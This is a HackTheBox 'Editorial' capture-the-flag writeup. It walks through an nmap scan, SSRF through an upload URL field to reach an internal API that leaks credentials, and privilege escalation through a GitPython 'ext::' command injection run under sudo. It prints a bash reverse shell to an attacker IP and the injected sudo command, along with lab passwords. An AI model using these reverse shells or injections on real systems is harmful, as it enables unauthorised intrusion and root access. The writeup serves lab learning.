---
title: "Editorial - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Editorial
![](https://kar0nx.github.io/assets/images/writeup/a466db5ce4f7aaea98f588d1cb71a0aa.png)
## Reconnaissance

IP: 10.10.11.20
## NMAP

```
nmap -T4 -p- -A 10.10.11.20
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 07:23 UTC
Nmap scan report for 10.10.11.20
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   30.59 ms 10.10.14.1
2   30.67 ms 10.10.11.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
```

## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903092512.png)

3 users

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903092548.png)

on /about page I found email with different domain `submissions@tiempoarriba.htb`

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903092800.png)

and on /upload we have upload page asking for url, first taught is ssrf 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903092913.png)

checking for response we target our machine

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903103723.png)

and we got request, so on lets check for open localports on the box. Simply copy request, save and I like to use ffuf for fast port scan.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903104317.png)

```
ffuf -request request -request-proto http -w <(seq 1 65535) -fs 61
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903104844.png)

port 5000 with different response, let's check it.
Tried to open in browser but didn't work, so CURL this.
JS stuff so we can add |jq for better look

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903105142.png)

```
curl http://editorial.htb/static/uploads/e7ddc8a2-b66d-4fd4-8d4e-d1efd7df5113 |jq
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903105241.png)

Tried all endpoints but only /api/latest/metadata/messages/authors works, and we can see message with username and password.

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903105348.png)

dev dev080217_devAPI!@
Great now we can connect via SSH

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903105535.png)

## Privilege Escalation

In home folder we see apps folder and inside .git folder so start by enumerating git 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903105736.png)

checking all logs I found downgrading prod to dev, which contains prod password 080217_Producti0n_2023!@

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903110703.png)

Login vi ssh and searching for quick wins

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903110844.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903111522.png)

searching google I found RCE exploit in python git repo
https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858

It works so let's make reverse shell srcipt 

```
#!/bin/bash  
bash -i >& /dev/tcp/10.10.14.8/4444 0>&1
```

and execute it with sudo permission

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/es.sh'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250903113454.png)